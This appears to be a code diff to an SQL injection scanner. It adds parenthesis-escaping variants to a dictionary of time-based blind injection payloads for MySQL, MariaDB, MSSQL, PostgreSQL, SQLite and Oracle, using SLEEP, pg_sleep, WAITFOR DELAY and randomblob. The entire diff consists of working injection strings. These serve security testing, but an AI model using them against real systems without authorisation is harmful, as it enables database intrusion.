@@ -235,6 +235,10 @@ TIME_PAYLOADS: dict[str, List[str]] = {
         "'; WAITFOR DELAY '0:0:{delay}'-- -",
         "' AND randomblob(100000000)-- -",
         "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
+        # Paren-escape contexts
+        "')) AND SLEEP({delay})-- -",
+        "')) AND pg_sleep({delay})-- -",
+        "')) AND randomblob({blob_size})-- -",
     ],
     "mysql": [
         "' AND SLEEP({delay})-- -",
@@ -244,26 +248,38 @@ TIME_PAYLOADS: dict[str, List[str]] = {
         " AND SLEEP({delay})-- -",
         "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
         "' AND BENCHMARK({bench},MD5(1))-- -",
+        # Paren-escape contexts
+        "') AND SLEEP({delay})-- -",
+        "')) AND SLEEP({delay})-- -",
+        "')) AND SLEEP({delay}) --",
     ],
     "mariadb": [
         "' AND SLEEP({delay})-- -",
         "' AND SLEEP({delay})#",
         " AND SLEEP({delay})-- -",
         "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
+        "') AND SLEEP({delay})-- -",
+        "')) AND SLEEP({delay})-- -",
     ],
     "mssql": [
         "'; WAITFOR DELAY '0:0:{delay}'-- -",
         "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
         "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'-- -",
+        "')) ; WAITFOR DELAY '0:0:{delay}'-- -",
     ],
     "postgres": [
         "' AND pg_sleep({delay})-- -",
         "'; SELECT pg_sleep({delay})-- -",
         "' OR pg_sleep({delay})-- -",
         "' AND 1=1 AND pg_sleep({delay})-- -",
+        "') AND pg_sleep({delay})-- -",
+        "')) AND pg_sleep({delay})-- -",
     ],
     "sqlite": [
         "' AND randomblob({blob_size})-- -",   # {blob_size} = delay * 10_000_000
+        "') AND randomblob({blob_size})-- -",
+        "')) AND randomblob({blob_size})-- -",
+        "')) AND randomblob({blob_size}) --",
     ],
     "oracle": [
         # Oracle has no simple sleep — use DBMS_PIPE.RECEIVE_MESSAGE (requires execute priv)
